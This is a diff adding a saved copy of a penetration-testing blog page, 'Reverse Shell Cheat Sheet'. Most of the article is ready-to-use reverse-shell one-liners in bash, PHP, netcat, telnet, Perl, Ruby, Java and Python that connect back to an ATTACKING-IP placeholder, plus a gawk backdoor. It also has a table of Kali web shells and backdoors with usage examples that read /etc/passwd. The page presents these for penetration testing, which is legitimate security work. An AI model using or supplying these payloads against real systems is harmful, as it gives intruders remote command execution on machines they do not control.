@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)https://highon.coffee/blog/reverse-shell-cheat-sheet/ -->
+<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script async="" data-rocketsrc="https://www.google-analytics.com/analytics.js" data-rocketoptimized="true"></script><script type="text/javascript" src="https://www.google-analytics.com/analytics.js"></script><script src="./Reverse Shell Cheat Sheet_files/oTwK22odZsY2CPSkVz5V2kmEjP0.js"></script><script type="text/javascript">
+//<![CDATA[
+window.__cfRocketOptions = {byc:0,p:0,petok:"3cbf308d62068557f8d37e37caf6104381049e53-1522501515-1800"};
+//]]>
+</script>
+<script type="text/javascript" src="./Reverse Shell Cheat Sheet_files/rocket.min.js"></script><style></style>
+<link rel="canonical" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">
+<title>Reverse Shell Cheat Sheet</title>
+<meta name="description" content="Reverse Shell Cheat Sheet, a list of reverse shells for connecting back">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="https://highon.coffee/feed.xml">
+<link rel="stylesheet" href="./Reverse Shell Cheat Sheet_files/css">
+<link rel="stylesheet" type="text/css" href="./Reverse Shell Cheat Sheet_files/screen.css">
+<link href="./Reverse Shell Cheat Sheet_files/font-awesome.min.css" rel="stylesheet">
+<link rel="icon" type="image/x-icon" href="https://highon.coffee/favicon.ico">
+<!--[if lt IE 9]>
+  <script src="/js/html5shiv.min.js"></script>
+  <script src="/js/respond.min.js"></script>
+  <![endif]-->
+
+<script async="" defer="" data-rocketsrc="https://buttons.github.io/buttons.js" type="text/rocketscript" data-rocketoptimized="true"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="https://highon.coffee/blog/">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<h1>
+<a href="https://highon.coffee/">
+<span>HighOn.Coffee</span>
+<img src="./Reverse Shell Cheat Sheet_files/highoncoffee.png" width="300" height="115" alt="Logo">
+</a>
+</h1>
+</div>
+<nav class="main-nav unit two-thirds hide-on-mobiles">
+<ul>
+<li class="">
+<a href="https://highon.coffee/">Home</a>
+</li>
+<li class="current">
+<a href="https://highon.coffee/blog/">Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/about/"><span class="hide-on-mobiles">About</span></a>
+</li>
+<li class="">
+<a href="https://highon.coffee/services/"><span class="hide-on-mobiles">Services</span></a>
+</li>
+</ul>
+</nav>
+</div>
+</header>
+<section class="blog">
+<div class="grid">
+<div class="docs-nav-mobile unit whole show-on-mobiles">
+<select onchange="if (this.value) window.location.href=this.value">
+<option value="">Navigate the blog…</option>
+<option value="/blog/">Home</option>
+<optgroup label="v1.x">
+<option value="/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</option>
+<option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
+<option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
+<option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
+<option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
+<option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
+<option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
+<option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
+<option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
+<option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
+<option value="/blog/vi-cheat-sheet/">Vi Cheat Sheet</option>
+<option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
+<option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
+<option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
+<option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
+<option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
+<option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
+<option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
+<option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</option>
+<option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
+<option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</option>
+<option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
+<option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
+<option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH &amp; Meterpreter Pivoting Techniques</option>
+<option value="/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</option>
+<option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
+<option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
+<option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
+<option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</option>
+<option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
+<option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
+<option value="/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</option>
+<option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
+<option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
+<option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
+<option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
+<option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
+<option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
+</optgroup>
+</select>
+</div>
+<div class="unit four-fifths">
+<article>
+<h2>
+Reverse Shell Cheat Sheet
+<a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" class="permalink" title="Permalink">∞</a>
+</h2>
+<span class="post-category">
+<span class="label">
+cheat-sheet
+</span>
+</span>
+<div class="post-meta">
+<span class="post-date">
+29 Mar 2015
+</span>
+<a href="https://twitter.com/Arr0way" class="post-author">
+<img src="./Reverse Shell Cheat Sheet_files/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
+Arr0way
+</a>
+</div>
+<div class="post-content">
+<ul id="markdown-toc">
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#setup-listening-netcat" id="markdown-toc-setup-listening-netcat">Setup Listening Netcat</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells" id="markdown-toc-bash-reverse-shells">Bash Reverse Shells</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell" id="markdown-toc-php-reverse-shell">PHP Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#netcat-reverse-shell" id="markdown-toc-netcat-reverse-shell">Netcat Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#telnet-reverse-shell" id="markdown-toc-telnet-reverse-shell">Telnet Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell" id="markdown-toc-perl-reverse-shell">Perl Reverse Shell</a> <ul>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-windows-reverse-shell" id="markdown-toc-perl-windows-reverse-shell">Perl Windows Reverse Shell</a></li>
+</ul>
+</li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#ruby-reverse-shell" id="markdown-toc-ruby-reverse-shell">Ruby Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#java-reverse-shell" id="markdown-toc-java-reverse-shell">Java Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell" id="markdown-toc-python-reverse-shell">Python Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#gawk-reverse-shell" id="markdown-toc-gawk-reverse-shell">Gawk Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-web-shells" id="markdown-toc-kali-web-shells">Kali Web Shells</a> <ul>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-php-web-shells" id="markdown-toc-kali-php-web-shells">Kali PHP Web Shells</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-perl-reverse-shell" id="markdown-toc-kali-perl-reverse-shell">Kali Perl Reverse Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-cold-fusion-shell" id="markdown-toc-kali-cold-fusion-shell">Kali Cold Fusion Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-asp-shell" id="markdown-toc-kali-asp-shell">Kali ASP Shell</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells" id="markdown-toc-kali-aspx-shells">Kali ASPX Shells</a></li>
+<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-jsp-reverse-shell" id="markdown-toc-kali-jsp-reverse-shell">Kali JSP Reverse Shell</a></li>
+</ul>
+</li>
+</ul>
+<p>During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.</p>
+<p>Below are a collection of <strong>reverse shells</strong> that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.</p>
+<p>If you found this resource usefull you should also check out our <a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">penetration testing tools</a> cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.</p>
+<h2 id="setup-listening-netcat">Setup Listening Netcat<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#setup-listening-netcat"><i class="fa fa-link"></i></a></h2>
+<p>Your remote shell will need a listening netcat instance in order to connect back.</p>
+<div class="note tip">
+<h5>Set your Netcat listening shell on an allowed port</h5>
+<p>Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443</p>
+</div>
+<p>To setup a listening netcat instance, enter the following:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>nc -nvlp 80
+nc: listening on :: 80 ...
+nc: listening on 0.0.0.0 80 ...</code></pre></figure>
+<div class="note info">
+<h5>NAT requires a port forward</h5>
+<p>If you're attacking machine is behing a NAT router, you'll need to setup a port forward to the attacking machines IP / Port.</p>
+</div>
+<p><strong>ATTACKING-IP</strong> is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).</p>
+<h2 id="bash-reverse-shells">Bash Reverse Shells<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells"><i class="fa fa-link"></i></a></h2>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ATTACKING-IP/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">exec </span>5&lt;&gt;/dev/tcp/ATTACKING-IP/80
+cat &lt;&amp;5 | <span class="k">while </span><span class="nb">read </span>line; <span class="k">do</span> <span class="nv">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="k">done</span>  
+
+<span class="c"># or:</span>
+
+<span class="k">while </span><span class="nb">read </span>line 0&lt;&amp;5; <span class="k">do</span> <span class="nv">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="k">done</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1</code></pre></figure>
+<h2 id="php-reverse-shell">PHP Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<p>A useful PHP reverse shell:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">php -r <span class="s1">'$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+<span class="o">(</span>Assumes TCP uses file descriptor 3. If it doesn<span class="s1">'t work, try 4,5, or 6)</span></code></pre></figure>
+<h2 id="netcat-reverse-shell">Netcat Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#netcat-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<p>Useful netcat reverse shell examples:</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc -e /bin/sh ATTACKING-IP 80</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/bin/sh | nc ATTACKING-IP 80</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">rm -f /tmp/p; mknod /tmp/p p <span class="o">&amp;&amp;</span> nc ATTACKING-IP 4444 0/tmp/p</code></pre></figure>
+<h2 id="telnet-reverse-shell">Telnet Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#telnet-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">rm -f /tmp/p; mknod /tmp/p p <span class="o">&amp;&amp;</span> telnet ATTACKING-IP 80 0/tmp/p</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443</code></pre></figure>
+<p>Remember to listen on 443 on the attacking machine also.</p>
+<h2 id="perl-reverse-shell">Perl Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="s">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span></code></pre></figure>
+<h3 id="perl-windows-reverse-shell">Perl Windows Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-windows-reverse-shell"><i class="fa fa-link"></i></a></h3>
+<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="nv">perl</span> <span class="o">-</span><span class="nv">MIO</span> <span class="o">-</span><span class="nv">e</span> <span class="s">'$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="s">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span></code></pre></figure>
+<h2 id="ruby-reverse-shell">Ruby Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#ruby-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></code></pre></figure>
+<h2 id="java-reverse-shell">Java Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#java-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[])</span>
+<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span></code></pre></figure>
+<h2 id="python-reverse-shell">Python Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>
+<h2 id="gawk-reverse-shell">Gawk Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#gawk-reverse-shell"><i class="fa fa-link"></i></a></h2>
+<figure class="highlight"><pre><code class="language-gawk" data-lang="gawk">#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd&gt; "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |&amp; Service
+                        Service |&amp; getline cmd
+                        if (cmd) {
+                                while ((cmd |&amp; getline) &gt; 0)
+                                        print $0 |&amp; Service
+                                close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}</code></pre></figure>
+<h2 id="kali-web-shells">Kali Web Shells<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-web-shells"><i class="fa fa-link"></i></a></h2>
+<p>The following shells exist within Kali Linux, under <code>/usr/share/webshells/</code> these are only useful if you are able to upload, inject or transfer the shell to the machine.</p>
+<h3 id="kali-php-web-shells">Kali PHP Web Shells<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-php-web-shells"><i class="fa fa-link"></i></a></h3>
+<p>Kali PHP reverse shells and command shells:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>/usr/share/webshells/php/<br>php-reverse-shell.php</code></p>
+</td>
+<td>
+<p>Pen Test Monkey - PHP Reverse Shell</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>/usr/share/webshells/<br>php/php-findsock-shell.php</code></p>
+<p><code>/usr/share/webshells/<br>php/findsock.c</code></p>
+</td>
+<td>
+<p>Pen Test Monkey, Findsock Shell. Build <code>gcc -o findsock findsock.c</code> (be mindfull of the target servers architecture), execute with netcat not a browser <code>nc -v target 80</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>/usr/share/webshells/<br>php/simple-backdoor.php</code></p>
+</td>
+<td>
+<p>PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: <code>http://target.com/simple-<br>backdoor.php?cmd=cat+/etc/passwd</code></p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>/usr/share/webshells/<br>php/php-backdoor.php</code></p>
+</td>
+<td>
+<p>Larger PHP shell, with a text input box for command execution.</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="note tip">
+<h5>Tip: Executing Reverse Shells</h5>
+<p>The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.</p>
+</div>
+<h3 id="kali-perl-reverse-shell">Kali Perl Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-perl-reverse-shell"><i class="fa fa-link"></i></a></h3>
+<p>Kali perl reverse shell:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>/usr/share/webshells/perl/<br>perl-reverse-shell.pl</code></p>
+</td>
+<td>
+<p>Pen Test Monkey - Perl Reverse Shell</p>
+</td>
+</tr>
+<tr>
+<td>
+<p><code>/usr/share/webshells/<br>perl/perlcmd.cgi</code></p>
+</td>
+<td>
+<p>Pen Test Monkey, Perl Shell. Usage: <code>http://target.com/perlcmd.cgi?cat /etc/passwd</code></p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="kali-cold-fusion-shell">Kali Cold Fusion Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-cold-fusion-shell"><i class="fa fa-link"></i></a></h3>
+<p>Kali Coldfusion Shell:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>/usr/share/webshells/cfm/cfexec.cfm</code></p>
+</td>
+<td>
+<p>Cold Fusion Shell - aka CFM Shell</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="kali-asp-shell">Kali ASP Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-asp-shell"><i class="fa fa-link"></i></a></h3>
+<p>Classic ASP Reverse Shell + CMD shells:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>/usr/share/webshells/asp/</code></p>
+</td>
+<td>
+<p>Kali ASP Shells</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="kali-aspx-shells">Kali ASPX Shells<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells"><i class="fa fa-link"></i></a></h3>
+<p>ASP.NET reverse shells within Kali:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>/usr/share/webshells/aspx/</code></p>
+</td>
+<td>
+<p>Kali ASPX Shells</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="kali-jsp-reverse-shell">Kali JSP Reverse Shell<a class="header-link" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-jsp-reverse-shell"><i class="fa fa-link"></i></a></h3>
+<p>Kali JSP Reverse Shell:</p>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<p><code>/usr/share/webshells/jsp/jsp-reverse.jsp</code></p>
+</td>
+<td>
+<p>Kali JSP Reverse Shell</p>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<section class="share-box">
+<div class="grid">
+<div class="unit whole">
+<div class="grid pane">
+<div class="unit whole center-on-mobiles">
+<div class="pane-content">
+<h2>Share this on...</h2>
+<p><a href="https://twitter.com/intent/tweet?text=Reverse%20Shell%20Cheat%20Sheet&amp;url=https://highon.coffee/blog/reverse-shell-cheat-sheet/&amp;via=Arr0way&amp;related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/reverse-shell-cheat-sheet/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
+<a href="https://plus.google.com/share?url=https://highon.coffee/blog/reverse-shell-cheat-sheet/" rel="nofollow" target="_blank" title="Share on Google+"><i class="fa fa-google-plus-square" aria-hidden="true"></i> Google+</a>
+<a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/reverse-shell-cheat-sheet/&amp;title=Reverse%20Shell%20Cheat%20Sheet" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>
+<h2><br>Follow Arr0way</h2>
+<p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
+<a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
+<p><br></p>
+</div>
+</div>
+<h2><br>Also... <br> <br>You might want to read these</h2>
+</div>
+</div>
+</div></section>
+<div class="mobile-side-scroller">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Post Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>cheat-sheet</code></p></pc>
+</td>
+ <td>
+<pc><p><b><a href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>kali linux</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</a></b></p></pc>
+</td>
+</tr>
+<tr>
+<td>
+<pc><p><code>walkthroughs</code></p></pc>
+</td>
+<td>
+<pc><p><b><a href="https://highon.coffee/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</a></b></p></pc>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles">
+<aside>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/">All Blog</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/cheat-sheet/">Cheat Sheets</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/techniques/">Techniques</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/security-hardening/">Security Hardening</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/walkthroughs/">WalkThroughs</a>
+</li>
+</ul>
+<h4>Cheat Sheets</h4>
+<ul>
+<li class="">
